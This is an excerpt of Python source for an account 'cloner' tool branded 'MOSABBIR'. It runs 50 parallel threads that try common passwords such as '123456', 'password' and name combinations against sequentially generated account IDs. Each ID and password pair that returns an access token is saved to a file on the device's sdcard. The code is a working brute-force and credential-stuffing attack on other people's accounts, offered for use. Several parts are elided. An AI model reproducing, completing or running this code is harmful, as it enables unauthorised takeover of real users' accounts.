...
class OLD_CLONER:
    ...
    def banner(self):
        os.system("clear")
        print(f"{W}<{R}•{W}> ("DEVELOPER "):   __  __                 _     _     _      
 |  \/  |               | |   | |   (_)     
 ...
 |_|  |_|\___/|___/\__,_|_.__/|_.__/|_|_|   ")
    ...
    def oldClone(self,series):
        ...
        with ThreadPoolExecutor(max_workers=50) as Mr_Code:
            ...
            for love in self.gen:
                ids = self.uX + love
                passlist = ["123456", "1234567", "12345678", "123456789", "123123", "112233", "1234567890", "password", "@@@###", "first last", "firstlast", "First Last"]
    ...
    def CloneOld(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r\r\x1b[mMOSABBIR-XD {self.loop}|OLD|OK:{len(self.oks)}|CP:{len(self.cps)}")
        sys.stdout.flush()
        try:
            for pas in passlist:
                data = {
                ...
                if "access_token" in response:
                    ...
                    open("/sdcard/MOSABBIR-OLD-CP.txt","a").write(ids+"|"+pas+"\n")
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
